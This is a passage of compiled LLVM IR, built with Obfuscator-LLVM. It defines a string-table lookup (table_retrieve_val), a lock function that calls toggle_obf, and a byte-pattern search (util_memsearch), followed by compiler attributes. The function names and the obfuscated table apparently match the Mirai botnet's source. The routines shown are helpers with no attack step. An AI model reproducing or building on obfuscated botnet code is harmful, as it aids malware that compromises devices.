  store i8 %35, i8* %31, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %36 = load i16, i16* %7, align 8
  %37 = zext i16 %36 to i64
  %38 = icmp slt i64 %indvars.iv.next, %37
  br i1 %38, label %11, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %11
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_lock_val(i8 zeroext) local_unnamed_addr #9 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) local_unnamed_addr #9 {
  %3 = sext i32 %0 to i64
  %4 = icmp eq i32* %1, null
  br i1 %4, label %9, label %5

; <label>:5:                                      ; preds = %2
  %6 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %3, i32 1
  %7 = load i16, i16* %6, align 8
  %8 = zext i16 %7 to i32
  store i32 %8, i32* %1, align 4
  br label %9

; <label>:9:                                      ; preds = %2, %5
  %10 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %3, i32 0
  %11 = load i8*, i8** %10, align 16
  ret i8* %11
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @util_memsearch(i8* nocapture readonly, i32, i8* nocapture readonly, i32) local_unnamed_addr #5 {
  %5 = icmp sle i32 %3, %1
  %6 = icmp sgt i32 %1, 0
  %or.cond = and i1 %5, %6
  br i1 %or.cond, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %4
  %7 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %20
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %20 ]
  %.016 = phi i32 [ 0, %.lr.ph.preheader ], [ %.1, %20 ]
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %9 = load i8, i8* %8, align 1
  %10 = sext i32 %.016 to i64
  %11 = getelementptr inbounds i8, i8* %2, i64 %10
  %12 = load i8, i8* %11, align 1
  %13 = icmp eq i8 %9, %12
  br i1 %13, label %14, label %20

; <label>:14:                                     ; preds = %.lr.ph
  %15 = add nsw i32 %.016, 1
  %16 = icmp eq i32 %15, %3
  br i1 %16, label %17, label %20

; <label>:17:                                     ; preds = %14
  %18 = trunc i64 %indvars.iv to i32
  %19 = add nsw i32 %18, 1
  br label %.loopexit

; <label>:20:                                     ; preds = %.lr.ph, %14
  %.1 = phi i32 [ %15, %14 ], [ 0, %.lr.ph ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %21 = icmp slt i64 %indvars.iv.next, %7
  br i1 %21, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %20
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %17
  %.013 = phi i32 [ %19, %17 ], [ -1, %4 ], [ -1, %.loopexit.loopexit ]
  ret i32 %.013
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind }
attributes #11 = { nounwind readnone }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146846898}
!2 = !{i32 -2146846489}
!3 = distinct !{!3, !4, !5}
!4 = !{!"llvm.loop.vectorize.width", i32 1}
!5 = !{!"llvm.loop.interleave.count", i32 1}
!6 = distinct !{!6, !7, !4, !5}
!7 = !{!"llvm.loop.unroll.runtime.disable"}
!8 = distinct !{!8, !4, !5}
!9 = distinct !{!9, !7, !4, !5}
